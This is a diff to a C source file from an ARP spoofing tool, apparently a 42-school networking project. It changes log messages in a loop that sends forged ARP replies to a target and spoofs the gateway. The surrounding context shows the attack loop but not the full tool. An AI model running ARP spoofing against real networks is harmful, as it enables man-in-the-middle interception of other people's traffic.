@@ -6,7 +6,7 @@
 /*   By: irifarac <marvin@42.fr>                    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/11/22 11:57:46 by irifarac          #+#    #+#             */
-/*   Updated: 2024/11/28 12:30:30 by israel           ###   ########.fr       */
+/*   Updated: 2024/11/28 18:51:51 by israel           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -78,7 +78,9 @@ static void set_arp_spoof(t_info info)
 	while(!stop)
 	{
 		set_hdrs(eth, arp, source_mac, info.ip_target);
-		printf("sending arp reply to %s\n", info.ip_target);
+		printf("Sent ARP attack to: %s is at %02x:%02x:%02x:%02x:%02x:%02x\n",
+			info.ip_target, source_mac[0], source_mac[1], source_mac[2],
+			source_mac[3], source_mac[4], source_mac[5]);
 		if (stop)
 			break ;
 		if (sendto(sock, buffer, 42, 0, (struct sockaddr *)&device, sizeof(device)) < 0)
@@ -89,6 +91,7 @@ static void set_arp_spoof(t_info info)
 			break ;
 		}
 		spoof_gateway(eth, arp, source_mac, info.ip_target);
+		printf("Spoofed gateway ARP for target: %s\n", info.ip_target);
 		if (stop)
 			break ;
 		if (sendto(sock, buffer, 42, 0, (struct sockaddr *)&device, sizeof(device)) < 0)
@@ -100,7 +103,7 @@ static void set_arp_spoof(t_info info)
 		}
 		sleep(2);
 	}
-	printf("Exiting ARP spoofing\n");
+	printf(TC_RED "Stopping ARP spoofing\n"	TC_NRM);
 	close(sock);
 	sock = -1;
 }
@@ -149,9 +152,7 @@ int	main(int argc, char **argv)
 	bzero(info.gateway_ip, 16);
 	bzero(info.gateway_mac, 18);
 	get_gateway(info.gateway_ip);
-	printf("Gateway IP: %s\n", info.gateway_ip);
 	get_gateway_mac(info.gateway_ip, info.gateway_mac);
-	printf("Gateway MAC: %s\n", info.gateway_mac);
 	check_syntax(&info);
 	signal(SIGINT, sigint_handler);
 	signal(SIGTERM, sigint_handler);
